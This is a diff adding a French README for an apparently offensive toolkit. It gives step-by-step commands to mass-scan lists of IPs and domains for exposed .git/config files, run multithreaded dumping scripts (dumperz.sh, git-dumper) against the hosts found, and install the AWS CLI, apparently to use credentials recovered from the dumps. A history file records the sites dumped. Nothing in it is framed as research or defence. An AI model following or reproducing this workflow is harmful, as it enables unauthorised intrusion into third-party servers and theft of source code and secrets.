@@ -1,0 +1,54 @@
+#1)
+Pour installer le script sur ton vps :
+
+source install.sh
+install-sezyo-v2
+
+--
+
+#2) Pour commencer a chercher les NDD ou IP liste avec des vuln :
+
+nohup bash gitfinder.sh ip.txt 100 &
+#100 etant le nombre de thread mais tu peux mettre +
+#taliste.txt ca peut etre aussi bien une liste de ndd de subdomains ou liste d'ip
+#si tu veux savoir si ca tourne encore tu fais ps aux | grep "gitfinder\.sh"
+#ensuite cv te sortir un fichier vulns.txt quand c finito
+#si le scrip n'a pas finis pour enlever les /config tu fais cette commande :
+sed -i 's/\/config$//g' vulns.txt
+
+--
+
+#3) exploit:
+
+nohup bash dumperz.sh vulns.txt &
+#si tu veux multi thread tu fais :
+split -l 60 vulns.txt lol
+for i in $(ls lol*); do nohup bash dumperz.sh $i &done&
+#-l 10 etant le nombre de ligne par fichier que tu veux (si le fichier vulns.txt fait 1000 lignes et que tu veux 10 threads bah tu met 100 fin ta compris)
+#lol etant juste un prefix pour les fichiers qui vont se creer pour diviser la liste vulns en plusieurs fichier
+#si tu veux savoir si ca tourne encore tu fais:
+ps aux | grep "dumperz\.sh"
+#si tu veux tout aretter tu fais:
+kill -9 $(ps aux | grep "dumperz\.sh" | awk '{print $2}' | tr '\n' ' ')
+kill -9 $(ps aux | grep "git\-dumper" | awk '{print $2}' | tr '\n' ' ')
+
+--
+
+#4 CLI Install
+
+#Pour installer CLI :
+$ sudo curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
+$ sudo unzip awscliv2.zip
+$ sudo ./aws/install
+#Pour voir si c'est intaller faire:
+$ aws --version
+
+
+
+#5) infos:
+
+t'as la liste des sites ou ip que t'as dump dans history.txt
+
+
+
+
